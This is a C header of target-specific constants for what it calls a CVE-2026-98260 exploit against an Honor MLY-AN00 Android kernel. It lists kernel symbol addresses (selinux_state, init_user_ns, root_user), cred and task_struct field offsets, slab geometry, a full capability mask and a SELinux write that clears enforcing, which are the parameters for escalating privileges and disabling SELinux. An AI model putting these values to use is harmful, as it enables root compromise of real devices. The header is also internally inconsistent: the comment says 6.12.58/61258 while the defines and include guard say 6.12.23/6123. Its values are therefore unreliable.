/* pc98260_target_61258.h — CVE-2026-98260 per-build constants.
 *
 * Target: Honor MLY-AN00 (honor-61258)
 *   kernel_release = 6.12.58-android16-6-g3a7ac1674240-abogki541502914-4k
 *   4K pages, VA_BITS=39
 *
 * Derived from:
 *   - <local-work>/vmlinux.elf   (.symtab)
 *   - <local-work>/vmlinux.btf   (.BTF)
 *   - live /proc/slabinfo, cap_last_cap
 *   - 6.18 Mi18P source as the method/layout reference only (values NOT copied)
 *
 * Never hand-edit without re-running the derivation in
 * docs/PARAMETER-MATRIX-6.18-6.12.md.
 */
#ifndef PC98260_TARGET_6123_H
#define PC98260_TARGET_6123_H

#include <stdint.h>

#define TARGET_NAME          "honor-6123"
#define TARGET_KERNEL        "6.12.23-android16-5-g45ea5e4bce8a-abogki445100407-4k"
#define TARGET_KERNEL_SHA256 "065a777a85600c06cb6424d409ea8e3b04a7440a9a475442b6ca48f921267a41" /* optional: fill from boot.img */

/* ---- absolute addresses (link-time; add g_slide at runtime) ---------- */
#define LINK_SELINUX_STATE   UINT64_C(0xffffffc082656570)  /* selinux_state */
#define LINK_INIT_USER_NS    UINT64_C(0xffffffc0823f1360)  /* init_user_ns */
#define LINK_ROOT_USER       UINT64_C(0xffffffc0823f15d8)  /* root_user    */
#define LINK_INIT_GROUPS     UINT64_C(0xffffffc0823f2aa0)  /* init_groups  */
#define LINK_INIT_UCOUNTS    UINT64_C(0xffffffc0823f2f70)  /* init_ucounts */

/* ---- kprobe/tracepoint call sites (function-internal; NOT portable) ---
 * node[0] of the address is the instruction right after
 * `bl kmem_cache_alloc_noprof`; tracepoint records exactly this value.
 */
#define LINK_ALLOC_TIMER     UINT64_C(0xffffffc080cbb390)  /* do_timer_create+0xac */
#define LINK_ALLOC_CRED      UINT64_C(0xffffffc080cec86c)  /* prepare_creds+0x2c  */
#define LINK_ALLOC_TASK      UINT64_C(0xffffffc080c7c6c4)  /* copy_process+0x190 (observed) */

/* ---- struct geometry (6.12.58 .BTF, byte offsets) ---- */
#define GEO_TASK_CRED        0x900   /* task_struct.cred          */
#define GEO_TASK_REAL_CRED   0x8f8   /* task_struct.real_cred     */
#define GEO_TASK_COMM        0x910   /* task_struct.comm          */
#define GEO_KITIMER_IT       0x78    /* k_itimer.it (cpu_timer.node) */
#define GEO_KITIMER_SIZE     0x100   /* sizeof(k_itimer)          */
#define GEO_KITIMER_STRIDE   0x100   /* kmem_cache stride         */
#define GEO_CRED_SIZE        184     /* sizeof(struct cred)       */
#define GEO_CRED_ALLOC_SIZE  192     /* cred_jar cache object size (bytes_alloc) */
#define GEO_CRED_UID         0x8
#define GEO_CRED_GID         0xc
#define GEO_CRED_SUID        0x10
#define GEO_CRED_SGID        0x14
#define GEO_CRED_EUID        0x18
#define GEO_CRED_EGID        0x1c
#define GEO_CRED_FSUID       0x20
#define GEO_CRED_FSGID       0x24
#define GEO_CRED_CAP_INH     0x30
#define GEO_CRED_CAP_PERM    0x38
#define GEO_CRED_CAP_EFF     0x40
#define GEO_CRED_CAP_BSET    0x48
#define GEO_CRED_CAP_AMB     0x50
#define GEO_CRED_SECURITY    0x80
#define GEO_CRED_USER        0x88
#define GEO_CRED_USER_NS     0x90
#define GEO_SELINUX_ENFORCE  0
#define GEO_SELINUX_INIT     1
#define GEO_SELINUX_WRITE    (-7)   /* clear 7 bytes + enforcing */
#define GEO_SELINUX_SIZE     0x80

/* ---- slab geometry (live /proc/slabinfo) ---------------------------- */
#define GEO_TASK_OBJSIZE            5696  /* task_struct cache object, 5 obj/slab, 8 pages */
#define GEO_TASK_OBJ_PER_SLAB       5
#define GEO_TASK_SLAB_PAGES         8
#define GEO_POSIX_TIMER_OBJSIZE     256
#define GEO_POSIX_TIMER_OBJ_PER_SLAB 32
#define GEO_POSIX_TIMER_SLAB_ORDER  1     /* 2 pages = 8192 bytes */
#define GEO_PAGE_SIZE               4096
#define GEO_FRAG_PAGE_SIZE          8192  /* posix_timers_cache slab */

/* ---- kernel addressing ---------------------------------------------- */
#define GEOM_PAGE_OFFSET     UINT64_C(0xffffff8000000000)
#define GEOM_VA_BITS         39
#define GEOM_MEMSTART_PFN    UINT64_C(0x80000) /* inferred from 61258 mapping */
#define GEOM_MEMSTART_ADDR   UINT64_C(0xffffffc0817e4638) /* memstart_addr symbol */

/* ---- privilege bitmask ---------------------------------------------- */
#define CAP_FULL             UINT64_C(0x1ffffffffff) /* cap_last_cap=40 */

/* ---- begin_new_exec cleanup offsets (vulnerability check) ----------- */
#define BNE_LINK              UINT64_C(0xffffffc080cf4164)
#define BNE_RELEASE_TASK_OFF  0xa48  /* release_task call site */
#define BNE_DOWN_READ_OFF     0x168  /* exec_mmap down_read_killable */
#define BNE_TIMERS_EXIT_OFF   0x2a0  /* posix_cpu_timers_exit */
#define BNE_EXIT_ITIMERS_OFF  0x2b0  /* exit_itimers */

#endif /* PC98260_TARGET_61258_H */
